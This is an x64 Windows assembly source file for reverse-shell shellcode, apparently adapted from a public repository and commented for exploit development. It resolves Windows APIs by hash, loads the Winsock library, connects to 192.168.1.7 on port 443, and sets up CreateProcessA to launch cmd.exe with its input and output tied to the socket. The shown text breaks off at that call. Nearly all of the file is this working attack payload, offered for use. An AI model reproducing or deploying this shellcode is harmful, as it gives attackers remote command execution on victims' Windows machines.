; Assembly version of shellcode found here: https://github.com/senzee1984/Windows_x64_Tcp_Reverse_Shell_Shellcode/tree/main
; Really, all revshell shellcodes are gonna look the same, though.
; If you need to remove some bad characters for exploit dev, then 
; just use objdump to see which opcodes need to be substituted.

%use masm

section .data

section .bss

section .text
  global _start                     ; must be declared for linker

_start:

; First portion is essentially identical for all shellcodes. We need to get kernel32.dll's address
; and we need to make helper functions which find memory locations of WinAPI functions we need to call.

find_kernel32:
    xor rdx, rdx;                           ; Clear rdx
    mov rax, gs:[rdx+0x60]                  ; RAX stores the value of ProcessEnvironmentBlock member in TEB, which is the PEB address
    mov rsi,[rax+0x18]                      ; Get the value of the LDR member in PEB, which is the address of the _PEB_LDR_DATA structure
    mov rsi,[rsi + 0x20]                    ; RSI is the address of the InMemoryOrderModuleList member in the _PEB_LDR_DATA structure
    mov r9, [rsi]                           ; Current module is [current_running_app].exe
    mov r9, [r9]                            ; Current module is ntdll.dll
    mov r9, [r9+0x20]                       ; Current module is kernel32.dll
    jmp jump_section                        ;

parse_module:        
    mov ecx, dword ptr [r9 + 0x3c]          ; R9 stores the base address of the module, get the NT header offset REMEMBER THIS FOR LATER
    xor r15, r15                            ;
    mov r15b, 0x88                          ; Offset to Export Directory   
    add r15, r9                             ;
    add r15, rcx                            ;
    mov r15d, dword ptr [r15]               ; Get the RVA of the export directory
    add r15, r9                             ; R14 stores the VMA of the export directory
    mov ecx, dword ptr [r15 + 0x18]         ; ECX stores  the number of function names as an index value
    mov r14d, dword ptr [r15 + 0x20]        ; Get the RVA of ENPT
    add r14, r9                             ; R14 stores  the VMA of ENPT

search_function:        
    jrcxz not_found                         ; If RCX is 0, the given function is not found
    dec ecx                                 ; Decrease index by 1
    xor rsi, rsi                            ;
    mov esi, [r14 + rcx*4]                  ; RVA of function name string
    add rsi, r9                             ; RSI points to function name string

function_hashing:        
    xor rax, rax                            ;
    xor rdx, rdx                            ;
    cld                                     ; Clear DF flag

iteration:        
    lodsb                                   ; Copy the next byte of RSI to Al
    test al, al                             ; If reaching the end of the string
    jz compare_hash                         ; Compare hash
    ror edx, 0x0d                           ; Part of hash algorithm
    add edx, eax                            ; Part of hash algorithm
    jmp iteration                           ; Next byte

compare_hash:        
    cmp edx, r8d                            ;
    jnz search_function                     ; If not equal, search the previous function (index decreases)
    mov r10d, [r15 + 0x24]                  ; Ordinal table RVA
    add r10, r9                             ; Ordinal table VMA
    movzx ecx, word ptr [r10 + 2*rcx]       ; Ordinal value -1
    mov r11d, [r15 + 0x1c]                  ; RVA of EAT
    add r11, r9                             ; VMA of EAT
    mov eax, [r11 + 4*rcx]                  ; RAX stores  RVA of the function
    add rax, r9                             ; RAX stores  VMA of the function
    ret                                     ;

not_found:
    ret                                     ;

jump_section:        
    mov rbp, r9                             ; RBP stores base address of Kernel32.dll
    mov r8d, 0xec0e4e8e                     ; LoadLibraryA Hash
    call parse_module                       ; Search LoadLibraryA's address
    mov r12, rax                            ; R12 stores address of LoadLibraryA function

load_module:
    xor rax, rax                            ;
    mov ax, 0x6c6c                          ; Save the string ll to RAX
    push rax                                ; Push the string to the stack
    mov rax, 0x642E32335F325357             ; Save the string WS2_32.D to RAX
    push rax                                ; Push the string to the stack
    mov rcx, rsp                            ; RCX points to the WS2_32.dll string
    sub rsp, 0x20                           ; Function prologue
    mov rax, r12                            ; RAX stores address of LoadLibraryA function
    call rax                                ; LoadLibraryA(ws2_32.dll)
    add rsp, 0x20                           ; Function epilogue
    mov r14, rax                            ; R14 stores the base address of ws2_32.dll

call_wsastartup:
    mov r9, rax                             ; R9 stores the base address of ws2_32.dll
    mov r8d, 0x3bfcedcb                     ; Hash of WSAStartup
    mov rbx, r9                             ; Save the base address of ws2_32.dll to RBX for later use
    call parse_module                       ; Search for and get the address of WSAStartup
    xor rcx, rcx                            ;
    mov cx, 0x198                           ;
    sub rsp, rcx                            ; Reserve enough space for the lpWSDATA structure
    lea rdx, [rsp]                          ; Assign the address of lpWSAData to the RDX register as the 2nd parameter
    mov cx, 0x202                           ; Assign 0x202 to wVersionRequired and store it in RCX as the 1st parameter
    sub rsp, 0x30                           ; Function prologue
    call rax                                ; Call WSAStartup
    add rsp, 0x30                           ; Function epilogue

call_wsasocket:
    mov r9, rbx                             ;
    mov r8d, 0xadf509d9                     ; Hash of WSASocketA function
    call parse_module                       ; Get the address of WSASocketA function
    sub rsp, 0x30                           ; Function prologue
    xor rcx, rcx                            ;
    mov cl, 2                               ; AF is 2 as the 1st parameter
    xor rdx, rdx                            ;
    mov dl, 1                               ; Type is 1 as the 2nd parameter
    xor r8, r8                              ;
    mov r8b, 6                              ; Protocol is 6 as the 3rd parameter
    xor r9, r9                              ; lpProtocolInfo is 0 as the 4th parameter
    mov [rsp+0x20], r9                      ; g is 0 as the 5th parameter, stored on the stack
    mov [rsp+0x28], r9                      ; dwFlags is 0 as the 6th parameter, stored on the stack
    call rax                                ; Call WSASocketA function
    mov r12, rax                            ; Save the returned socket type return value in R12 to prevent data loss in RAX
    add rsp, 0x30                           ; Function epilogue

call_wsaconnect:
    mov r9, rbx                             ;
    mov r8d, 0xb32dba0c                     ; Hash of WSAConnect
    call parse_module                       ; Get the address of WSAConnect
    sub rsp, 0x20                           ; Allocate enough space for the socketaddr structure
    mov rcx, r12                            ; Pass the socket descriptor returned by WSASocketA to RCX as the 1st parameter
    xor rdx, rdx                            ;
    mov dl, 2                               ; Set sin_family to AF_INET (=2)
    mov [rsp], rdx                          ; Store the socketaddr structure
    xor rdx, rdx                            ;
    mov dx, 0xbb01                          ; Set local port to 443
    mov [rsp+2], rdx                        ; Pass the port value to the corresponding position in the socketaddr structure
    mov edx, 0xf8fe5740                     ; Negative value of IP=192.168.1.7
    neg edx                                 ; Neg it to avoid 0x00 byte   
    mov [rsp+4], rdx                        ; Pass IP to the corresponding position in the socketaddr structure
    lea rdx, [rsp]                          ; Pointer to the socketaddr structure as the 2nd parameter
    xor r8, r8                              ;
    mov r8b, 0x16                           ; Set namelen member to 0x16
    xor r9, r9                              ; lpCallerData is 0 as the 4th parameter
    sub rsp, 0x38                           ; Function prologue
    mov [rsp+0x20], r9                      ; lpCalleeData is 0 as the 5th parameter
    mov [rsp+0x28], r9                      ; lpSQOS is 0 as the 6th parameter
    mov [rsp+0x30], r9                      ; lpGQOS is 0 as the 7th parameter
    call rax                                ; Call WSAConnect
    add rsp, 0x38                           ; Function epilogue

call_createprocess:
    mov r9, rbp                             ; R9 stores the base address of Kernel32.dll
    mov r8d, 0x16b3fe72                     ; Hash of CreateProcessA
    call parse_module                       ; Get the address of CreateProcessA
    mov rdx, 0xff9a879ad19b929c             ; NOT exe.dmc
    not rdx                                 ;
    push rdx                                ;   
    mov rdx, rsp                            ; Pointer to cmd.exe is stored in the RCX register
    push r12                                ; The member STDERROR is the return value of WSASocketA
    push r12                                ; The member STDOUTPUT is the return value of WSASocketA
    push r12                                ; The member STDINPUT is the return value of WSASocketA
    xor rcx, rcx                            ;
    push cx                                 ; Pad with 0x00 before pushing the dwFlags member, only the total size matters
    push rcx                                ;
    push rcx                                ;
    mov cl, 0xff                            ;
    inc cx                                  ; 0xff+1=0x100
    push cx                                 ; dwFlags=0x100
    xor rcx, rcx                            ;
    push cx                                 ; Pad with 0 before pushing the cb member, only the total size matters
    push cx                                 ;
    push rcx                                ;
    push rcx                                ;
    push rcx                                ;
    push rcx                                ;
    push rcx                                ;
    push rcx                                ;
    mov cl, 0x68                            ;
    push rcx                                ; cb=0x68
    mov rdi, rsp                            ; Pointer to STARTINFOA structure
    mov rcx, rsp                            ;
    sub rcx, 0x20                           ; Reserve enough space for the ProcessInformation structure
    push rcx                                ; Address of the ProcessInformation structure as the 10th parameter
    push rdi                                ; Address of the STARTINFOA structure as the 9th parameter
    xor rcx, rcx                            ;
    push rcx                                ; Value of lpCurrentDirectory is 0 as the 8th parameter
    push rcx                                ; lpEnvironment=0 as the 7th argument
    push rcx                                ; dwCreationFlags=0 as the 6th argument
    inc rcx                                 ;
    push rcx                                ; Value of bInheritHandles is 1 as the 5th parameter
    dec cl                                  ;
    push rcx                                ; Reserve space for the function return area (4th parameter)
    push rcx                                ; Reserve space for the function return area (3rd parameter)
    push rcx                                ; Reserve space for the function return area (2nd parameter)
    push rcx                                ; Reserve space for the function return area (1st parameter)
    mov r8, rcx                             ; lpProcessAttributes value is 0 as the 3rd parameter
    mov r9, rcx                             ; lpThreatAttributes value is 0 as the 4th parameter
    call rax                                ; Call CreateProcessA
